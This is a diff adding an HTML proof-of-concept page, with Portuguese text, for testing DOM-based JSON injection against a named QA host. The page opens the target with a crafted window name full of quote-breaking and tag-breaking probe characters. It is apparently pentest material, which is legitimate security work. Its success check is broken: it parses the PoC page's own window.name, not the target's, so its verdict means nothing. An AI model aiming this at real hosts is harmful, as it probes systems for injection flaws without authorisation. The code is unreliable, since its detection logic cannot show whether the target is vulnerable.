@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC - DOM-based JSON Injection</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+        }
+        .success {
+            color: green;
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PoC - DOM-based JSON Injection - Alyce</h1>
+        <p>Esta página abrirá a aplicação alvo com um nome de janela malicioso para testar a vulnerabilidade de injeção de JSON baseada no DOM.</p>
+        <button onclick="openTarget()">Abrir Aplicação Alvo</button>
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+        function openTarget() {
+            // Abrir a aplicação alvo com um nome de janela malicioso
+            window.open('https://qa.neoway.com.br/apps/', 'l2ojxhikwq%2527%2522`\'"/l2ojxhikwq/><l2ojxhikwq/\>kzm33rr2xu&');
+            document.getElementById('status').innerHTML = 'Aplicação alvo aberta. Verifique a nova janela para ver se a injeção de JSON foi bem-sucedida.';
+        }
+
+        // Verificar se a injeção de JSON foi bem-sucedida
+        window.onload = function() {
+            try {
+                var data = JSON.parse(window.name);
+                document.getElementById('status').innerHTML = '<p class="success">Injeção de JSON bem-sucedida!</p><p>Dados injetados: ' + JSON.stringify(data) + '</p>';
+            } catch (e) {
+                document.getElementById('status').innerHTML = '<p class="error">Injeção de JSON falhou. Verifique se a aplicação alvo está vulnerável.</p>';
+            }
+        }
+    </script>
+</body>
+</html>
+
